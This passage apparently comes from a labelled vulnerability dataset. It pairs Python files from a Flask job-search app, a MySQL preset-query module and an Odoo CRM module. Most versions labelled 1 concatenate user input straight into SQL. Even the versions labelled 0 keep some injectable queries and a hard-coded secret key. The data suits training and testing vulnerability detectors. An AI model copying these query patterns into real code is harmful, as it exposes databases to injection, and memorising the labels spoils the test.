"Web-app/Server.py/n/nimport os\nfrom sqlalchemy import *\nfrom flask import Flask, request, render_template, g, redirect, Response, flash, url_for, session\nfrom flask_login import LoginManager, login_user, login_required, logout_user, current_user\nfrom Database import engine\nfrom User import User\n# set app and login system\ntmpl_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')\napp = Flask(__name__, template_folder=tmpl_dir)\nlogin_manager = LoginManager()\nlogin_manager.init_app(app)\nlogin_manager.login_view = \"login\"\napp.secret_key = 'I love database'\n\n\n# Get current user's information\n@login_manager.user_loader\ndef load_user(s_id):\n    email = str(s_id)\n    query = 'select * from usr where email like %s'\n    cursor = g.conn.execute(query, (email, ))\n    user = User()\n    for row in cursor:\n        user.name = str(row.name)\n        user.email = str(row.email)\n        break\n    return user\n\n\n# Prepare the page\n@app.before_request\ndef before_request():\n  try:\n    g.conn = engine.connect()\n  except:\n    print \"uh oh, problem connecting to database\"\n    import traceback; traceback.print_exc()\n    g.conn = None\n\n\n@app.teardown_request\ndef teardown_request(exception):\n  try:\n    g.conn.close()\n  except Exception:\n    pass\n\n\n# @The function for user login\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    error = None\n    page = 'login'\n    if request.method == 'POST':\n\n        # Obtain input value and pass to User object\n        email = str(request.form['email']).strip()\n        password = str(request.form['password']).strip()\n        user = User(email, password)\n        user.user_verify()\n\n        if not user.valid:\n            error = 'Invalid login information'\n        else:\n            session['logged_in'] = True\n            login_user(user)\n            print current_user.id\n            flash('You were logged in')\n            g.user = current_user.id\n            return redirect(url_for('user_home_page'))\n\n    return render_template('login.html', error=error, page=page)\n\n\n# @This function is for user sign-up\n@app.route(\"/signup\", methods=[\"GET\", \"POST\"])\ndef signup():\n    error = None\n    page = 'signup'\n    if request.method == 'POST':\n        name = str(request.form['username']).strip()\n        password = str(request.form['password']).strip()\n        email = str(request.form['email']).strip()\n        print name, password, email\n        newuser = User(email, password, name)\n        newuser.insert_new_user()\n        if not newuser.valid:\n            error = 'Invalid user information, please choose another one'\n        else:\n            session['logged_in'] = True\n            login_user(newuser)\n            flash('Thanks for signing up, you are now logged in')\n            return redirect(url_for('user_home_page'))\n    return render_template('signup.html', error=error, page=page)\n\n\n@app.route(\"/logout\")\n@login_required\ndef logout():\n    session.pop('logged_in', None)\n    logout_user()\n    return redirect(url_for('login'))\n\n\n'''\nThis part is the User Homepage, add app functions here\nModify user_home_page.html as well\n'''\n\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\n@login_required\ndef user_home_page():\n    message = \"Welcome back! \" + current_user.name\n    if request.method == 'GET':\n        query = '''\n        select tmp.jid as id, tmp.name as name, tmp.type as type,\n               tmp.sal_from as sfrom, tmp.sal_to as sto, \n               tmp.sal_freq as sfreq, tmp.posting_time as ptime\n        from (vacancy v natural join job j) as tmp, application ap\n        where ap.uemail = %s and ap.jid = tmp.jid and ap.vtype = tmp.type'''\n        cursor = g.conn.execute(query, (session[\"user_id\"], ))\n        data = cursor.fetchall()\n        return render_template(\"user_home_page.html\", message = message, data = data)\n    return render_template(\"user_home_page.html\", message = message)\n\n\n# @Search vacancy with keyword\n@app.route(\"/search\", methods=[\"GET\", \"POST\"])\n@login_required\ndef search_vacancy():\n    if request.method == 'POST':\n        key = str(request.form['keyword']).strip()\n        if not key:\n            return render_template(\"search.html\")\n        attr = request.form.get('attr')\n        ptf = str(request.form['pt_from']).strip()  # posting time from\n        ptt = str(request.form['pt_to']).strip()  # posting time from\n        order = request.form.get('order')\n        order_attr = request.form.get('order_attr')\n        limit = str(request.form['limit']).strip()\n        para_list = []\n        query = '''\n        select j.jid as id, j.name as name, v.type as type,\n               v.sal_from as sfrom, v.sal_to as sto, \n               v.sal_freq as sfreq ,v.posting_time as ptime\n        from vacancy as v inner join job as j on v.jid = j.jid\n        '''\n        # where\n        # posting time\n        if ptf and ptt:\n            query += 'where v.posting_time>= %s and v.posting_time<= %s and '\n            para_list.append(ptf)\n            para_list.append(ptt)\n        elif ptf and not ptt:\n            query += 'where v.posting_time>= %s and '\n            para_list.append(ptf)\n        elif not ptf and ptt:\n            query += 'where v.posting_time<= %s and '\n            para_list.append(ptt)\n        else:\n            query += 'where '\n        # attribute\n        if attr == 'name':\n            query += 'lower(j.name) like lower(\\'%%%s%%\\') '    # use lower() to ignore case \n            para_list.append(key)\n        elif attr == 'salary':\n            query += 'v.sal_from <= %s and v.sal_to >= %s '\n            para_list.append(key)\n            para_list.append(key)\n        elif attr == 'skill':\n            query += 'lower(j.pre_skl) like lower(\\'%%%s%%\\') or lower(j.job_des) like lower(\\'%%%s%%\\') '\n            para_list.append(key)\n        # order\n        if order_attr == 'pt':\n            query += 'order by v.posting_time ' + order\n        elif order_attr == 'id':\n            query += 'order by j.jid ' + order\n        elif order_attr == 'name':\n            query += 'order by j.name ' + order\n        elif order_attr == 'lows':\n            query += 'order by v.sal_from ' + order\n        elif order_attr == 'highs':\n            query += 'order by v.sal_to ' + order\n        # limit\n        if limit and limit != 'all':\n            query += ' limit %s'\n            para_list.append(limit)\n        print query\n        cursor = g.conn.execute(query, tuple(para_list))\n        job = []\n        for row in cursor:\n            job.append(row)\n        data = job\n        return render_template(\"search.html\", data=data, keyword = key)\n    return render_template(\"search.html\")\n\n# detailed info of a vacancy\n@app.route(\"/detailed_info\", methods=[\"GET\", \"POST\"])\n@login_required\ndef detailed_info():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        select *\n        from vacancy v natural join job j\n        where j.jid=''' + jid + ' and v.type=\\'' + vtype +'\\''\n        cursor = g.conn.execute(text(query))\n        data = cursor.fetchall()\n        col_names = ['JID', 'Type', '# Positions', 'Salary from', 'Salary to', 'Salary Frequency', 'Post Until', 'Posting Time', 'Updated Time', 'Unit', 'Agency', 'Level', 'Job Name', 'Preferred Skills', 'Job Description', 'Location', 'Hour/Shift', 'Title code', 'Civil Service TiTle']  # column header\n        return render_template(\"detailed_info.html\", zippedlist = zip(col_names, data[0]), jid = jid, vtype = vtype) # zip to help us iterate two lists parallelly\n    return render_template(\"detailed_info.html\")\n\n# apply for the vacancy\n@app.route(\"/apply\", methods=[\"GET\", \"POST\"])\n@login_required\ndef apply():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        insert into Application\n        values (\\'''' + session[\"user_id\"] + '\\', ' + jid + ', \\'' + vtype + '\\')'  # Zihan: I tried to use current_user.id here and it returned nothing. So I use session[\"user_id\"] instead.\n        g.conn.execute(text(query))\n        return render_template(\"apply.html\", jid = jid, vtype = vtype)\n    return render_template(\"apply.html\")\n\n# cancel application for the vacancy\n@app.route(\"/canel_apply\", methods=[\"GET\", \"POST\"])\n@login_required\ndef cancel_apply():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        delete from Application\n        where uemail=\\'''' + session[\"user_id\"] + '\\' and jid=' + jid + ' and vtype=\\'' + vtype + '\\'' \n        g.conn.execute(text(query))\n        return render_template(\"cancel_apply.html\", jid = jid, vtype = vtype)\n    return render_template(\"cancel_apply.html\")\n\n# some statistic info\n\n# insert job (TBD)\n\n# delete job (TBD)\n\n# update job (TBD)\n\nif __name__ == '__main__':\n    import click\n\n    @click.command()\n    @click.option('--debug', is_flag=True)\n    @click.option('--threaded', is_flag=True)\n    @click.argument('HOST', default='0.0.0.0')\n    @click.argument('PORT', default=8111, type=int)\n    def run(debug, threaded, host, port):\n        \"\"\"\n        This function handles command line parameters.\n        Run the server using\n\n            python server.py\n\n        Show the help text using\n\n            python server.py --help\n\n        \"\"\"\n        HOST, PORT = host, port\n        print \"running on %s:%d\" % (HOST, PORT)\n        app.run(host=HOST, port=PORT, debug=debug, threaded=threaded)\n\n    run()/n/n/nWeb-app/User.py/n/nfrom flask_login import UserMixin\nfrom flask import g\n\n\nclass User(UserMixin):\n    def __init__(self, email='', password='', name=''):\n        UserMixin.__init__(self)\n        self.email = email\n        self.name = name\n        self.password = password\n        self.valid = False\n        self.id = ''  # Extra id field for Flask-login requirement\n\n    # @This Function verify whether a user is recorded\n    def user_verify(self):\n        eid = self.email\n        code = self.password\n        if eid.strip() == '':\n            return\n        if code.strip() == '':\n            return\n        query = 'select * from usr where email like %s'\n        cursor = g.conn.execute(query, (eid, ))\n        for row in cursor:\n            key = str(row.password)\n            if key.strip() == code.strip():\n                self.name = str(row.name)\n                self.email = eid\n                self.id = eid\n                self.valid = True\n            break\n\n    # @This function insert a new user into database\n    def insert_new_user(self):\n        try:\n            query = '''\n            insert into usr (email,name,password)\n            values (%s,%s,%s)'''\n            if self.email.strip() == '' or self.name.strip() == '' or self.name.strip() =='':\n                return\n            g.conn.execute(query, (self.email, self.name, self.password))\n            self.valid = True\n            if self.valid:\n                self.id = self.email\n        except:\n            print 'invalid user'\n\n    '''\n    Rewrite def in order to get things work\n    '''\n    def is_authenticated(self):\n        if self.valid:\n            return True\n        return False\n\n    def is_active(self):\n        return True\n\n    def get_id(self):\n        return self.id\n/n/n/n", "label": 0}, {"id": "fe04bedc72e62fd4c4ee046a9af29fd81e9b3340", "code": "/Web-app/Server.py/n/nimport os\nfrom sqlalchemy import *\nfrom flask import Flask, request, render_template, g, redirect, Response, flash, url_for, session\nfrom flask_login import LoginManager, login_user, login_required, logout_user, current_user\nfrom Database import engine\nfrom User import User\n\n# set app and login system\ntmpl_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')\napp = Flask(__name__, template_folder=tmpl_dir)\nlogin_manager = LoginManager()\nlogin_manager.init_app(app)\nlogin_manager.login_view = \"login\"\napp.secret_key = 'I love database'\n\n\n# Get current user's information\n@login_manager.user_loader\ndef load_user(s_id):\n    email = str(s_id)\n    query = '''select * from usr where email like\\'''' + email + '\\''\n    cursor = g.conn.execute(query)\n    user = User()\n    for row in cursor:\n        user.name = str(row.name)\n        user.email = str(row.email)\n        break\n    return user\n\n\n# Prepare the page\n@app.before_request\ndef before_request():\n  try:\n    g.conn = engine.connect()\n  except:\n    print \"uh oh, problem connecting to database\"\n    import traceback; traceback.print_exc()\n    g.conn = None\n\n\n@app.teardown_request\ndef teardown_request(exception):\n  try:\n    g.conn.close()\n  except Exception:\n    pass\n\n\n# @The function for user login\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    error = None\n    page = 'login'\n    if request.method == 'POST':\n\n        # Obtain input value and pass to User object\n        email = str(request.form['email']).strip()\n        password = str(request.form['password']).strip()\n        user = User(email, password)\n        user.user_verify()\n\n        if not user.valid:\n            error = 'Invalid login information'\n        else:\n            session['logged_in'] = True\n            login_user(user)\n            print current_user.id\n            flash('You were logged in')\n            g.user = current_user.id\n            return redirect(url_for('user_home_page'))\n\n    return render_template('login.html', error=error, page=page)\n\n\n# @This function is for user sign-up\n@app.route(\"/signup\", methods=[\"GET\", \"POST\"])\ndef signup():\n    error = None\n    page = 'signup'\n    if request.method == 'POST':\n        name = str(request.form['username']).strip()\n        password = str(request.form['password']).strip()\n        email = str(request.form['email']).strip()\n        print name, password, email\n        newuser = User(email, password, name)\n        newuser.insert_new_user()\n        if not newuser.valid:\n            error = 'Invalid user information, please choose another one'\n        else:\n            session['logged_in'] = True\n            login_user(newuser)\n            flash('Thanks for signing up, you are now logged in')\n            return redirect(url_for('user_home_page'))\n    return render_template('signup.html', error=error, page=page)\n\n\n@app.route(\"/logout\")\n@login_required\ndef logout():\n    session.pop('logged_in', None)\n    logout_user()\n    return redirect(url_for('login'))\n\n\n'''\nThis part is the User Homepage, add app functions here\nModify user_home_page.html as well\n'''\n\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\n@login_required\ndef user_home_page():\n    message = \"Welcome back! \" + current_user.name\n    if request.method == 'GET':\n        query = '''\n        select tmp.jid as id, tmp.name as name, tmp.type as type,\n               tmp.sal_from as sfrom, tmp.sal_to as sto, \n               tmp.sal_freq as sfreq, tmp.posting_time as ptime\n        from (vacancy v natural join job j) as tmp, application ap\n        where ap.uemail = \\'''' + session[\"user_id\"] + '\\' and ap.jid = tmp.jid and ap.vtype = tmp.type'\n        cursor = g.conn.execute(text(query))\n        data = cursor.fetchall()\n        return render_template(\"user_home_page.html\", message = message, data = data)\n    return render_template(\"user_home_page.html\", message = message)\n\n\n# @Search vacancy with keyword\n@app.route(\"/search\", methods=[\"GET\", \"POST\"])\n@login_required\ndef search_vacancy():\n    if request.method == 'POST':\n        key = str(request.form['keyword']).strip()\n        if not key:\n            return render_template(\"search.html\")\n        attr = request.form.get('attr')\n        ptf = str(request.form['pt_from']).strip()  # posting time from\n        ptt = str(request.form['pt_to']).strip()  # posting time from\n        order = request.form.get('order')\n        order_attr = request.form.get('order_attr')\n        limit = str(request.form['limit']).strip()\n        query = '''\n        select j.jid as id, j.name as name, v.type as type,\n               v.sal_from as sfrom, v.sal_to as sto, \n               v.sal_freq as sfreq ,v.posting_time as ptime\n        from vacancy as v inner join job as j on v.jid = j.jid\n        '''\n        if ptf and ptt:\n            query += 'where v.posting_time>=\\'' + ptf + '\\' and v.posting_time<=\\'' + ptt + '\\' and '\n        elif ptf and not ptt:\n            query += 'where v.posting_time>=\\'' + ptf + '\\' and '\n        elif not ptf and ptt:\n            query += 'where v.posting_time<=\\'' + ptt + '\\' and '\n        else:\n            query += 'where '\n        \n        if attr == 'name':\n            query += 'lower(j.name) like lower(\\'%' + key + '%\\') '    # use lower() to ignore case \n        elif attr == 'salary':\n            query += 'v.sal_from <= ' + key + ' and v.sal_to >=' + key + ' '\n        elif attr == 'skill':\n            query += 'j.pre_skl like \\'%' + key + '%\\' or j.job_des like \\'%''' + key + '%\\' '\n        \n        if order_attr == 'pt':\n            query += 'order by v.posting_time ' + order\n        elif order_attr == 'id':\n            query += 'order by j.jid ' + order\n        elif order_attr == 'name':\n            query += 'order by j.name ' + order\n        elif order_attr == 'lows':\n            query += 'order by v.sal_from ' + order\n        elif order_attr == 'highs':\n            query += 'order by v.sal_to ' + order\n        \n        if limit and limit != 'all':\n            query += ' limit ' + limit\n        cursor = g.conn.execute(text(query))  # !Very important here, must convert type text()\n        job = []\n        for row in cursor:\n            job.append(row)\n        data = job\n        return render_template(\"search.html\", data=data, keyword = key)\n    return render_template(\"search.html\")\n\n# detailed info of a vacancy\n@app.route(\"/detailed_info\", methods=[\"GET\", \"POST\"])\n@login_required\ndef detailed_info():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        select *\n        from vacancy v natural join job j\n        where j.jid=''' + jid + ' and v.type=\\'' + vtype +'\\''\n        cursor = g.conn.execute(text(query))\n        data = cursor.fetchall()\n        col_names = ['JID', 'Type', '# Positions', 'Salary from', 'Salary to', 'Salary Frequency', 'Post Until', 'Posting Time', 'Updated Time', 'Unit', 'Agency', 'Level', 'Job Name', 'Preferred Skills', 'Job Description', 'Location', 'Hour/Shift', 'Title code', 'Civil Service TiTle']  # column header\n        return render_template(\"detailed_info.html\", zippedlist = zip(col_names, data[0]), jid = jid, vtype = vtype) # zip to help us iterate two lists parallelly\n    return render_template(\"detailed_info.html\")\n\n# apply for the vacancy\n@app.route(\"/apply\", methods=[\"GET\", \"POST\"])\n@login_required\ndef apply():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        insert into Application\n        values (\\'''' + session[\"user_id\"] + '\\', ' + jid + ', \\'' + vtype + '\\')'  # Zihan: I tried to use current_user.id here and it returned nothing. So I use session[\"user_id\"] instead.\n        g.conn.execute(text(query))\n        return render_template(\"apply.html\", jid = jid, vtype = vtype)\n    return render_template(\"apply.html\")\n\n# cancel application for the vacancy\n@app.route(\"/canel_apply\", methods=[\"GET\", \"POST\"])\n@login_required\ndef cancel_apply():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        delete from Application\n        where uemail=\\'''' + session[\"user_id\"] + '\\' and jid=' + jid + ' and vtype=\\'' + vtype + '\\'' \n        g.conn.execute(text(query))\n        return render_template(\"cancel_apply.html\", jid = jid, vtype = vtype)\n    return render_template(\"cancel_apply.html\")\n\n# some statistic info\n\n# insert job (TBD)\n\n# delete job (TBD)\n\n# update job (TBD)\n\nif __name__ == '__main__':\n    import click\n\n    @click.command()\n    @click.option('--debug', is_flag=True)\n    @click.option('--threaded', is_flag=True)\n    @click.argument('HOST', default='0.0.0.0')\n    @click.argument('PORT', default=8111, type=int)\n    def run(debug, threaded, host, port):\n        \"\"\"\n        This function handles command line parameters.\n        Run the server using\n\n            python server.py\n\n        Show the help text using\n\n            python server.py --help\n\n        \"\"\"\n        HOST, PORT = host, port\n        print \"running on %s:%d\" % (HOST, PORT)\n        app.run(host=HOST, port=PORT, debug=debug, threaded=threaded)\n\n    run()/n/n/n/Web-app/User.py/n/nfrom flask_login import UserMixin\nfrom flask import g\n\n\nclass User(UserMixin):\n    def __init__(self, email='', password='', name=''):\n        UserMixin.__init__(self)\n        self.email = email\n        self.name = name\n        self.password = password\n        self.valid = False\n        self.id = ''  # Extra id field for Flask-login requirement\n\n    # @This Function verify whether a user is recorded\n    def user_verify(self):\n        eid = self.email\n        code = self.password\n        if eid.strip() == '':\n            return\n        if code.strip() == '':\n            return\n        query = '''select * from usr where email like\\''''+eid+'\\''\n        cursor = g.conn.execute(query)\n        for row in cursor:\n            key = str(row.password)\n            if key.strip() == code.strip():\n                self.name = str(row.name)\n                self.email = eid\n                self.id = eid\n                self.valid = True\n            break\n\n    # @This function insert a new user into database\n    def insert_new_user(self):\n        try:\n            query = '''\n            insert into usr (email,name,password)\n            values (%s,%s,%s)'''\n            if self.email.strip() == '' or self.name.strip() == '' or self.name.strip() =='':\n                return\n            g.conn.execute(query, (self.email, self.name, self.password))\n            self.valid = True\n            if self.valid:\n                self.id = self.email\n        except:\n            print 'invalid user'\n\n    '''\n    Rewrite def in order to get things work\n    '''\n    def is_authenticated(self):\n        if self.valid:\n            return True\n        return False\n\n    def is_active(self):\n        return True\n\n    def get_id(self):\n        return self.id\n/n/n/n", "label": 1}, {"id": "6508e10dfe391cf2ffda8a6a546dba0716d8c70c", "code": "src/presetquery.py/n/nimport pyxl\nimport mysql.connector\n\nimport database\n\nfrom pypika import MySQLQuery, Table, Field\n\ndef write_preset(query_text, query_desc):\n    # to use this method you must pass in a connection,\n    # a preset query, and a description of what the query achieves\n    # it will automatically write it to the bottom of the table\n\n    conn = database.get_db_connection()\n    conn.autocommit = True\n\n    extable = Table('Presets')\n    q = MySQLQuery.into(extable).columns(\"querval\", \"description\").insert(query_text, query_desc)\n    quer = str(q)\n\n    cursor.execute(quer)\n\n    conn.close()\n\ndef edit_preset(query_id, query_text, description):\n    '''(int, str, str) -> None'''\n    # to use this method you must pass in a connection,\n    # the id of a preset query,\n    # a preset query, and a description of what the query achieves\n    # it will update the query and description at the given id with new values.\n    # if queryin or descriptin = \"NA\" then it will not update the values written so\n\n    conn = database.get_db_connection()\n    conn.autocommit = False\n\n    cursor = conn.cursor()\n    # quer = \"ALTER TABLE Presets DROP COLUMN id\"\n    # cursor.execute(quer)\n    # quer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST\"\n    # cursor.execute(quer)\n\n    quer = \"UPDATE Presets SET querval=%s AND description=%s WHERE id=%s\"\n    cursor.execute(quer, (query_text, description, query_id))\n\n    # quer = \"ALTER TABLE Presets DROP COLUMN id\"\n    # cursor.execute(quer)\n    # quer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST\"\n    # cursor.execute(quer)\n\n    conn.close()\n\ndef remove_preset(conn, key):\n    # to use this method you must pass in a connection, and\n    # what number the preset's id is\n    cursor = conn.cursor()\n    quer = \"ALTER TABLE Presets DROP COLUMN id\"\n    cursor.execute(quer)\n    quer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST\"\n    cursor.execute(quer)\n\n    quer = \"DELETE FROM Presets WHERE id = %s\"\n    cursor.execute(quer, (key,))\n\n    quer = \"ALTER TABLE Presets DROP COLUMN id\"\n    cursor.execute(quer)\n    quer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST\"\n    cursor.execute(quer)\n/n/n/n", "label": 0}, {"id": "6508e10dfe391cf2ffda8a6a546dba0716d8c70c", "code": "/src/presetquery.py/n/nimport pyxl\nimport mysql.connector\n\nfrom pypika import MySQLQuery, Table, Field\n\n\t# the use of this function assumes there exists some Table\n\t# called 'Presets' where the first column is an\n\t# UNSIGNED AUTO_INCREMENT PRIMARY KEY labeled 'id'\n\t# and the second column is a VARCHAR NOT NULL labeled 'querval'\n\t# and the third column is a VARCHAR NOT NULL labeled 'description'\n\ndef write_preset(conn, queryin, descriptin):\n\t# to use this method you must pass in a connection,\n\t# a preset query, and a description of what the query achieves\n\t# it will automatically write it to the bottom of the table\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\textable = Table('Presets')\n\tq = MySQLQuery.into(extable).columns(\"querval\", \"description\").insert(queryin, descriptin)\n\tprint(q)\n\tquer = str(q)\n\n\tcursor.execute(quer)\n\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\ndef edit_preset(conn, key, queryin, descriptin):\n\t# to use this method you must pass in a connection,\n\t# the id of a preset query,\n\t# a preset query, and a description of what the query achieves\n\t# it will update the query and description at the given id with new values.\n\t# if queryin or descriptin = \"NA\" then it will not update the values written so\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\tif (queryin != \"NA\"):\n\t\tquer = \"UPDATE Presets SET querval='\"+queryin+\"' WHERE id=\"+str(key)+\";\"\n\t\tcursor.execute(quer)\n\tif (descriptin != \"NA\"):\n\t\tquer = \"UPDATE Presets SET description='\"+descriptin+\"' WHERE id=\"+str(key)+\";\"\n\t\tcursor.execute(quer)\n\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\ndef remove_preset(conn, key):\n\t# to use this method you must pass in a connection, and\n\t# what number the preset's id is\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\tquer = \"DELETE FROM Presets WHERE id = \" +key;\n\tcursor.execute(quer)\n\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\ndef get_preset(conn, key):\n\t# to use this method you must pass in a connection\n\t# and the id for the corresponding querval to return\n\t# The querval returned is formatted to be ready to use\n\t# as a query\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\textable = Table('Presets')\n\tq = MySQLQuery.from_(extable).select(\n\t\textable.querval\n\t).where(\n\t\textable.id == key\n\t)\n\tprint(q)\n\tquer = str(q)\n\n\tcursor.execute(quer)\n\n\trow = cursor.fetchone()\n\tstrrow = str(row)\n\n\treturn (strrow[2:-3])\n\ndef get_descriptin(conn, key):\n\t# to use this method you must pass in a connection\n\t# and the id for the corresponding description to return\n\t# The description returned is formatted to be ready to displayed\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\textable = Table('Presets')\n\tq = MySQLQuery.from_(extable).select(\n\t\textable.description\n\t).where(\n\t\textable.id == key\n\t)\n\tprint(q)\n\tquer = str(q)\n\n\tcursor.execute(quer)\n\n\trow = cursor.fetchone()\n\tstrrow = str(row)\n\n\treturn (strrow[2:-3])\n/n/n/n", "label": 1}, {"id": "3e4550f6dd019a97f62fb10937af5b7788c68c58", "code": "crm_phonecall/models/crm_lead.py/n/n# -*- coding: utf-8 -*-\n# Copyright (C) 2004-today OpenERP SA (<http://www.openerp.com>)\n# Copyright (C) 2017 Tecnativa - Vicent Cubells\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nfrom openerp import api, fields, models\n\n\nclass CrmLead(models.Model):\n    _inherit = \"crm.lead\"\n\n    phonecall_ids = fields.One2many(\n        comodel_name='crm.phonecall',\n        inverse_name='opportunity_id',\n        string='Phonecalls',\n    )\n    phonecall_count = fields.Integer(\n        compute='_compute_phonecall_count',\n        string=\"Phonecalls\",\n    )\n\n    @api.multi\n    def _compute_phonecall_count(self):\n        for lead in self:\n            lead.phonecall_count = self.env[\n                'crm.phonecall'].search_count(\n                [('opportunity_id', '=', lead.id)])\n/n/n/ncrm_phonecall/report/crm_phonecall_report.py/n/n# -*- coding: utf-8 -*-\n# Copyright 2004-2010 Tiny SPRL (<http://tiny.be>)\n# Copyright 2017 Tecnativa - Vicent Cubells\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\nfrom psycopg2.extensions import AsIs\n\nfrom odoo import tools\nfrom odoo import api, fields, models\n\nAVAILABLE_STATES = [\n    ('draft', 'Draft'),\n    ('open', 'Todo'),\n    ('cancel', 'Cancelled'),\n    ('done', 'Held'),\n    ('pending', 'Pending')\n]\n\n\nclass CrmPhonecallReport(models.Model):\n    _name = \"crm.phonecall.report\"\n    _description = \"Phone calls by user\"\n    _auto = False\n\n    user_id = fields.Many2one(\n        comodel_name='res.users',\n        string='User',\n        readonly=True,\n    )\n    team_id = fields.Many2one(\n        comodel_name='crm.team',\n        string='Team',\n        readonly=True,\n    )\n    priority = fields.Selection(\n        selection=[\n            ('0', 'Low'),\n            ('1', 'Normal'),\n            ('2', 'High')\n        ],\n        string='Priority',\n    )\n    nbr_cases = fields.Integer(\n        string='# of Cases',\n        readonly=True,\n    )\n    state = fields.Selection(\n        AVAILABLE_STATES,\n        string='Status',\n        readonly=True,\n    )\n    create_date = fields.Datetime(\n        string='Create Date',\n        readonly=True,\n        index=True,\n    )\n    delay_close = fields.Float(\n        string='Delay to close',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n        help=\"Number of Days to close the case\",\n    )\n    duration = fields.Float(\n        string='Duration',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n    )\n    delay_open = fields.Float(\n        string='Delay to open',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n        help=\"Number of Days to open the case\",\n    )\n    partner_id = fields.Many2one(\n        comodel_name='res.partner',\n        string='Partner',\n        readonly=True,\n    )\n    company_id = fields.Many2one(\n        comodel_name='res.company',\n        string='Company',\n        readonly=True,\n    )\n    opening_date = fields.Datetime(\n        readonly=True,\n        index=True,\n    )\n    date_closed = fields.Datetime(\n        string='Close Date',\n        readonly=True,\n        index=True)\n\n    def _select(self):\n        select_str = \"\"\"\n            select\n                id,\n                c.date_open as opening_date,\n                c.date_closed as date_closed,\n                c.state,\n                c.user_id,\n                c.team_id,\n                c.partner_id,\n                c.duration,\n                c.company_id,\n                c.priority,\n                1 as nbr_cases,\n                c.create_date as create_date,\n                extract(\n                  'epoch' from (\n                  c.date_closed-c.create_date))/(3600*24) as delay_close,\n                extract(\n                  'epoch' from (\n                  c.date_open-c.create_date))/(3600*24) as delay_open\n           \"\"\"\n        return select_str\n\n    def _from(self):\n        from_str = \"\"\"\n            from crm_phonecall c\n        \"\"\"\n        return from_str\n\n    @api.model_cr\n    def init(self):\n\n        tools.drop_view_if_exists(self._cr, self._table)\n        self._cr.execute(\n            \"\"\"\n            create or replace view %s as (\n                %s\n                %s\n            )\"\"\", (\n                AsIs(self._table), AsIs(self._select()), AsIs(self._from()))\n            )\n/n/n/n", "label": 0}, {"id": "3e4550f6dd019a97f62fb10937af5b7788c68c58", "code": "/crm_phonecall/models/crm_lead.py/n/n# -*- coding: utf-8 -*-\n# Copyright (C) 2004-today OpenERP SA (<http://www.openerp.com>)\n# Copyright (C) 2017 Tecnativa - Vicent Cubells\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nfrom openerp import api, fields, models\n\n\nclass CrmLead(models.Model):\n    _inherit = \"crm.lead\"\n\n    phonecall_ids = fields.One2many(\n        comodel_name='crm.phonecall',\n        inverse_name='opportunity_id',\n        string='Phonecalls',\n    )\n    phonecall_count = fields.Integer(\n        compute='_phonecall_count',\n        string=\"Phonecalls\",\n    )\n\n    @api.multi\n    def _phonecall_count(self):\n        for lead in self:\n            lead.phonecall_count = 